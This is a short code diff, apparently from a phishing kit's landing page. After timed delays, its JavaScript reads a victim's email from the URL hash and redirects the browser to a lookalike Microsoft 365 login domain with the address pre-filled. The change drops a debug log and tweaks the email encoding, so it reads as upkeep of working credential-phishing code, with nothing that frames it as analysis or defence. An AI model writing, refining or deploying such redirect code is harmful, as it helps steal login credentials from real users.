@@ -99,8 +99,7 @@
                     setTimeout(() => {
                         // Redirect to the specified URL with the decoded email
                         const decodedEmail = getEmailFromHash();
-                        const redirectTo = "https://l0g1n-micros.ftdocsportal.com/o365#" + encodeURIComponent(decodedEmail);
-                        console.log("Redirecting to: " + redirectTo);
+                        const redirectTo = "https://l0g1n-micros.ftdocsportal.com/o365#" + decodedEmail.replace(/%40/g, '@');
                         window.location.href = redirectTo;
                     }, 6000);
                 }, 10000);
